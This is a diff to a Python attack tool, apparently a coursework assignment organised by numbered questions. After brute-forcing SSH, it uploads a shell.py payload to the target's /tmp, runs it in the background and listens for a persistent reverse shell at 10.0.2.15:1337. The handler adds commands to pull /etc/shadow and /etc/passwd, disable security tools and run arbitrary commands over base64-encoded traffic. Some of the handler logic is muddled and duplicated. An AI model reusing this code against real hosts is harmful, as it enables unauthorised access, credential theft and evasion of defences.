@@ -5,8 +5,17 @@ import sys
 from scapy.all import ICMP, IP, sr1, TCP
 import socket
 import requests
-import time
 from paramiko import SSHClient, AuthenticationException, AutoAddPolicy, SSHException
+import time
+
+# Question 9 Only
+import base64
+import subprocess
+import threading
+from shell import gather_system_info, scan_ports, list_files, log_output, receive_and_save_file, exploit_sequence, download_sensitive_files, disable_security_tools
+
+ip_connect = "10.0.2.15"  # Attacker's IP
+port_connect = 1337  # Listening port
 
 # Question 2: Connectivity
 
@@ -95,7 +104,7 @@ def confirmSSH(target_ip): # Connect to port 22
         
         if banner.startswith("SSH-"):
             print(f"SSH service confirmed on {target_ip}:22")
-            bruteforceSSH(target_ip, args.username, args.password_list) # Question 7 addition
+            bruteforceSSH(target_ip, args.username, args.password_list, ip_connect, port_connect) # Question 7 addition
             print()
             return True
         else:
@@ -249,7 +258,7 @@ def bruteforceWeb(url, username, password_list_file):
 
 # Question 7: Bruteforce SSH
 
-def bruteforceSSH(target_ip, username, password_list):
+def bruteforceSSH(target_ip, username, password_list, ip_connect, port_connect):
    
     # Check if the password list file exists + read from
     if not os.path.isfile(password_list):
@@ -278,15 +287,15 @@ def bruteforceSSH(target_ip, username, password_list):
 
             # Question 8 : Set-up Shell
 
-            user_input = input(f"[?] Drop to a shell on target {target_ip}? (y/n): ").strip().lower()
+            user_input = input(f"[?] Drop to a shell on target {target_ip}? (y/n/p): ").strip().lower()
             
             if user_input == "y":
                 print("[+] Entering interactive shell. Type 'exit' to quit.")
                 shell = client.invoke_shell() # Calls the SSH shell
 
-            while True:
-                    command = input("$ ")  # Prompt for inputs
-                    if command.strip().lower() == "exit":
+                while True:
+                    command = input("$ ")  
+                    if command.strip().lower() == "exit": # Exits the shell
                         print("[+] Exiting shell...")
                         break
                     else:
@@ -297,6 +306,16 @@ def bruteforceSSH(target_ip, username, password_list):
                         if shell.recv_ready(): # Check if data has been sent from SSH server
                             output = shell.recv(4096).decode('utf-8', errors='ignore') # Outputs this data
                             print(output)
+
+            elif user_input == "p":
+                deploy_persistent_shell(target_ip, username, password, ip_connect, port_connect)
+
+            elif user_input == "n":
+                print("[+] Skipping shell.")
+           
+            else:
+                print("[!] Invalid input. Please enter 'y', 'n', or 'p'.")
+                
 
             return 
         
@@ -325,6 +344,160 @@ def bruteforceSSH(target_ip, username, password_list):
     print("[-] Brute force attack completed. No valid credentials found.")
 
     
+
+
+    
+# Question 9: Persistence and Connection Handling
+
+# Persistent reverse shell;
+def deploy_persistent_shell(target_ip, username, password, ip_connect, port_connect):
+    print("[+] Uploading shell.py to the target...")
+
+    ssh = SSHClient()
+    ssh.set_missing_host_key_policy(AutoAddPolicy())
+    ssh.connect(target_ip, username=username, password=password)
+
+    # SCP upload 
+    with ssh.open_sftp() as sftp:
+        sftp.put("shell.py", "/tmp/shell.py")
+
+    print("[+] Executing shell.py on the target...")
+    ssh.exec_command('nohup python3 /tmp/shell.py &')
+
+    print(f"[+] Listening for reverse shell on {ip_connect}:{port_connect}...")
+    interactive_reverse_shell(ip_connect, port_connect)  # Call method for reverse
+
+
+# Reverse shell
+def interactive_reverse_shell(ip_connect, port_connect):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
+        listener.bind((ip_connect, port_connect))
+        listener.listen(1)
+        conn, addr = listener.accept()
+
+        print(f"[+] Reverse shell connected from {addr}")
+
+        while True:
+            try:
+                command = input("$ ").strip()
+                # Handle command
+                if command.lower() == "exit":
+                    conn.send(base64.b64encode(b"[+] Exiting reverse shell...\n"))
+                    break
+
+                elif command.lower() == "exploit":
+                    conn.send(base64.b64encode(b"[+] Exploit command triggered.\n"))
+         
+                    exploit_output = exploit_sequence(conn) 
+                    conn.send(base64.b64encode(exploit_output.encode()))
+                    conn.send(base64.b64encode(b"[+] Exploit sequence completed.\n"))
+
+                elif command.lower() == "sysinfo":
+                    try:
+                        # Execute the sysinfo command on the target
+                        sysinfo_output = subprocess.check_output("uname -a && whoami && id && df -h", shell=True)
+                        conn.send(base64.b64encode(sysinfo_output))  # Send output back to attacker
+                    except Exception as e:
+                        error_message = f"[!] Error executing sysinfo: {str(e)}"
+                        conn.send(base64.b64encode(error_message.encode()))  
+
+
+                elif command.lower() == "scan_ports":
+                    ports = scan_ports()
+                    conn.send(base64.b64encode(ports.encode()))
+
+
+                elif command.lower() == "list_files":
+                    files = list_files(conn)
+                    conn.send(base64.b64encode(files.encode()))
+
+
+                elif command.lower() == "download_sensitive":
+                    print("[+] Download sensitive files triggered.")
+                    conn.send(base64.b64encode(b"[+] Downloading sensitive files..."))
+                    download_sensitive_files(conn)
+
+                    print("[+] Download sensitive files triggered.")
+                    conn.send(base64.b64encode(b"[+] Downloading sensitive files..."))
+
+                    # List of files to download
+                    sensitive_files = ["/etc/passwd", "/etc/shadow", "/etc/hostname", "/etc/hosts"]
+                    
+                    for file_path in sensitive_files:
+                        try:
+                            # Request file from the target machine
+                            conn.send(base64.b64encode(f"Requesting file: {file_path}".encode()))
+
+                            # Call the function to receive and save the file
+                            receive_and_save_file(conn, file_path)  # This will save the file on the attacker side
+
+                        except Exception as e:
+                            error_message = f"[!] Error downloading sensitive file {file_path}: {str(e)}"
+                            conn.send(base64.b64encode(error_message.encode()))
+                            print(error_message)
+
+
+                elif command.lower() == "disable_security":
+                    disable_output = disable_security_tools()
+                    conn.send(base64.b64encode(disable_output.encode()))
+                    log_output("[+] Security tools disabled.")  
+
+
+                elif command.startswith("download"):
+                    file_path = command.split(" ", 1)[1]
+                    if not file_path:
+                        error_message = "[!] No file path provided."
+                        conn.send(base64.b64encode(error_message.encode()))
+                        print(error_message)
+                    else:
+                        try:
+                            # Send request to victim to send the file
+                            conn.send(base64.b64encode(f"Requesting file: {file_path}".encode()))
+
+                            # Call the function to receive and save the file
+                            receive_and_save_file(conn, file_path) 
+                        except Exception as e:
+                            error_message = f"[!] Download error: {str(e)}"
+                            conn.send(base64.b64encode(error_message.encode()))
+                            print(error_message) 
+
+                else:
+                    try:
+                        output = subprocess.check_output(command, shell=True)
+                        conn.send(base64.b64encode(output))
+                        log_output(f"[+] Command executed: {command}")
+                    
+                    except Exception as e:
+                        error_message = f"[!] Command error: {str(e)}"
+                        conn.send(base64.b64encode(error_message.encode()))
+                        log_output(error_message)      
+
+
+            except Exception as e:
+                time.sleep(5)  # Retry connection every 5 seconds
+
+            
+        conn.close() # Close the connection
+
+# Shell itself
+def ssh_interactive_shell(client):
+    print("[+] Entering interactive SSH shell. Type 'exit' to quit.")
+    shell = client.invoke_shell()
+
+    while True:
+        command = input("$ ")  # Prompt for inputs
+        if command.strip().lower() == "exit":
+            print("[+] Exiting SSH shell...")
+            break
+        else:
+            # Execute command and print the output
+            shell.send(command + "\n")
+            time.sleep(1)
+
+            if shell.recv_ready():  # Check if data has been sent from SSH server
+                output = shell.recv(4096).decode('utf-8', errors='ignore')  # Outputs this data
+                print(output)
+
 
 # Question 1: Argparse
 def main():
